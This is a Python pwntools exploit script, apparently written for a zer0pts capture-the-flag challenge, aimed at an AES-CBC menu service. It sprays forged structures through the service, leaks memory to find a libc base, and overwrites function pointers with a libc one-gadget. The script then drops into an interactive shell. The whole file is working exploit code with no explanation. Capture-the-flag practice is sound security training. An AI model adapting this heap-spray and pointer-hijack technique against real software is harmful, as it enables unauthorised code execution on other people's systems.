from pwn import *
from Crypto.Cipher import AES

HOST, PORT = '127.0.0.1', 31338
# HOST, PORT = 'pwn.ctf.zer0pts.com', 9003
context.arch = 'amd64'


def menu(s):
    r.recvuntil('> ')
    r.sendline(str(s))


def encrypt(): return r.sendline('4')
def _(x): return x.ljust(0x98, b'\x00')


base = 0xc000558000
base = 0xc0005b0000
base += 0x100
while True:
  try:
    r = remote(HOST, PORT)
    menu(2)
    r.sendline('')

    menu(3)
    r.sendline(_(p64(0)).hex())
    encrypt()

    menu(1)
    r.sendline((b"\x00" * 0x10 + b"jinmo123\x00".ljust(0xf0) + flat({
        0: "libc.so.6\x00",
        0x12: 0xff,
        0x20: p64(0x509a80) + p64(0x6822f4),
        0x30 + 0: 0x13371337,
        0x30 + 0x12: 0xff,
        0x30 + 0x20: p64(0x509a80) + p64(0x630fd4)
    }).ljust(0x80) * 0x1000).hex())

    p = p64(base) + p64(2) + p32(1)
    p = p.ljust(len(p) + 16 - len(p) % 16, b'\x00')
    iv = b'\x00' * 16
    aes = AES.new(b'\x00' * 16, AES.MODE_CBC, IV=iv)
    p = aes.decrypt(p)
    aes = AES.new(b'\x00' * 16, AES.MODE_CBC, IV=iv)
    p = _(p)

    menu(3)
    r.sendline(p.hex())
    menu(2)
    r.sendline(iv.hex())
    # pause()
    encrypt()

    # r.interactive()

    menu('2')
    r.sendline('')
    encrypt()

    start, end = 0x41414141, 0x41414141 + 0x100
    p = p64(base + 0x30) + p64(2) + p64(1) + p64(0) + p64(start) + p64(end)
    p += p64(0) * 2
    p = p.ljust(0x70, b'\x00') + p32(1)
    p = p.ljust(len(p) + (16 - len(p)) % 16, b'\x00')
    iv = b'\x00' * 16
    aes = AES.new(b'\x00' * 16, AES.MODE_CBC, IV=iv)
    p = aes.decrypt(p)
    aes = AES.new(b'\x00' * 16, AES.MODE_CBC, IV=iv)
    context.arch = 'amd64'
    p = _(p)

    menu('3')
    r.sendline(p.hex())
    menu('2')
    r.sendline(iv.hex())
    encrypt()

    r.recvuntil('Plaintext')
    r.recvline()
    r.recvline()

    data = r.recvuntil('==')
    assert len(data) >= 0x10000
    print(hex(len(data)))
  except KeyboardInterrupt:
    break
  except:
    print("Let's try", hex(base))
    r.close()
    continue
  break

for i in range(0, len(data) - 8, 8):
  ptr = u64(data[i:i+8])
  if ptr & 0xff0000000000 == 0x7f0000000000:
    print(hex(ptr))

print(hex(base))
libc = int(input(), 16) - 0x206000

menu(1)
r.sendline('')

menu(1)
r.sendline((b"\x00" * 0x10 + b"pwn\x00".ljust(0xf0) + flat({
    0: "libc.so.6\x00",
    0x12: 0xff,
    0x20: p64(libc + 0xe6c81) + p64(0x6822f4),
    0x30 + 0: 0x13371337,
    0x30 + 0x12: 0xff,
    0x30 + 0x20: p64(libc + 0xe6c81) + p64(0x630fd4)
}).ljust(0x80) * 0x8000).hex())

menu('2')
r.sendline('')
encrypt()

start, end = 0x41414141, 0x41414141 + 0x100
base = 0xc002212100
p = p64(base + 0x30) + p64(2) + p64(1) + p64(0) + p64(start) + p64(end)
p += p64(0) * 2
p = p.ljust(0x70, b'\x00') + p32(1)
p = p.ljust(len(p) + (16 - len(p)) % 16, b'\x00')
iv = b'\x00' * 16
aes = AES.new(b'\x00' * 16, AES.MODE_CBC, IV=iv)
p = aes.decrypt(p)
aes = AES.new(b'\x00' * 16, AES.MODE_CBC, IV=iv)
context.arch = 'amd64'
p = _(p)

menu('3')
r.sendline(p.hex())
menu('2')
r.sendline(iv.hex())
pause()
encrypt()
r.interactive()
